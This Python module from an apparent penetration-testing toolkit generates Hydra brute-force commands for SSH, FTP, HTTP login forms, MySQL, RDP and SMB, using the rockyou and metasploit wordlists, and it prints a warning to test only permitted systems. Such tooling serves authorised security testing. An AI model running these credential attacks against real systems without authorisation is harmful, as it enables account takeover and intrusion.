"""
Brute Force Module - Password/credential attacks using wordlists
Uses Hydra for SSH, HTTP forms, FTP, and other services.
"""

import shlex
from typing import Dict, Any, List

from .base import BaseModule
from utils.helpers import is_ip_address, validate_url


class BruteForceModule(BaseModule):
    """Password brute force / wordlist attack module using Hydra."""

    def get_info(self) -> Dict[str, str]:
        return {
            "name": "Brute Force",
            "description": "Password and credential attacks using wordlists (Hydra)",
            "version": "1.0.0",
        }

    def run(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Generate Hydra commands for brute forcing credentials against a target.
        Target can be: IP, hostname, or URL (for HTTP form/login).
        """
        target = target.strip()
        if not target:
            return {"error": "Target is required"}

        raw_config = getattr(self.config, "config", self.config) or {}
        tools = raw_config.get("tools", {})
        kali = tools.get("kali", {})
        wordlist_dir = kali.get("wordlist_dir", "/usr/share/wordlists")
        users_list = kali.get(
            "users_wordlist", f"{wordlist_dir}/metasploit/unix_users.txt"
        )
        pass_list = kali.get("passwords_wordlist", f"{wordlist_dir}/rockyou.txt")

        # Normalize target for different protocols
        from urllib.parse import urlparse

        host = target
        if validate_url(target):
            parsed = urlparse(target)
            host = parsed.netloc or target
        elif target.startswith("ssh://"):
            host = target.replace("ssh://", "").split("/")[0]
        elif target.startswith("ftp://"):
            host = target.replace("ftp://", "").split("/")[0]
        elif target.startswith("http://") or target.startswith("https://"):
            try:
                parsed = urlparse(target)
                host = parsed.netloc or target
            except Exception:
                host = target

        users_list = shlex.quote(users_list)
        pass_list = shlex.quote(pass_list)
        host_safe = shlex.quote(host)

        commands: List[Dict[str, str]] = []

        # SSH
        commands.append(
            {
                "service": "SSH (port 22)",
                "command": f"hydra -L {users_list} -P {pass_list} ssh://{host_safe} -t 4",
                "note": "Common usernames + rockyou passwords",
            }
        )

        # FTP
        commands.append(
            {
                "service": "FTP (port 21)",
                "command": f"hydra -L {users_list} -P {pass_list} ftp://{host_safe} -t 4",
                "note": "Try anonymous:anonymous first manually",
            }
        )

        # HTTP form (generic login)
        if "http" in target.lower() or validate_url(target):
            base_url = (
                target
                if target.startswith(("http://", "https://"))
                else f"http://{target}"
            )
            base_safe = shlex.quote(base_url)
            commands.append(
                {
                    "service": "HTTP POST form",
                    "command": f"hydra -L {users_list} -P {pass_list} {base_safe} http-post-form '/login:user=^USER^&pass=^PASS^:F=incorrect'",
                    "note": "Edit form path and params to match target",
                }
            )
            commands.append(
                {
                    "service": "HTTP Basic Auth",
                    "command": f"hydra -L {users_list} -P {pass_list} {base_safe} http-get /",
                    "note": "For Basic auth protected paths",
                }
            )

        # MySQL
        commands.append(
            {
                "service": "MySQL (port 3306)",
                "command": f"hydra -L {users_list} -P {pass_list} {host_safe} mysql -t 4",
                "note": "Common: root, admin",
            }
        )

        # RDP
        commands.append(
            {
                "service": "RDP (port 3389)",
                "command": f"hydra -L {users_list} -P {pass_list} rdp://{host_safe} -t 4",
                "note": "Windows Remote Desktop",
            }
        )

        # SMB (Windows shares)
        commands.append(
            {
                "service": "SMB (port 445)",
                "command": f"hydra -L {users_list} -P {pass_list} smb://{host_safe} -t 4",
                "note": "Windows file shares",
            }
        )

        lines = [
            f"[*] BRUTE FORCE MODULE - Target: {target}",
            "",
            "Generated Hydra commands (edit as needed):",
            "",
        ]
        for c in commands:
            lines.append(f"  [{c['service']}]")
            lines.append(f"  $ {c['command']}")
            lines.append(f"  # {c['note']}")
            lines.append("")
        lines.append(
            "[!] Only test systems you own or have explicit permission to test."
        )
        summary = "\n".join(lines)

        results = {
            "target": target,
            "host": host,
            "wordlists": {"users": users_list, "passwords": pass_list},
            "commands": commands,
            "summary": summary,
            "status": "completed",
        }

        self.log_result(results)
        return results
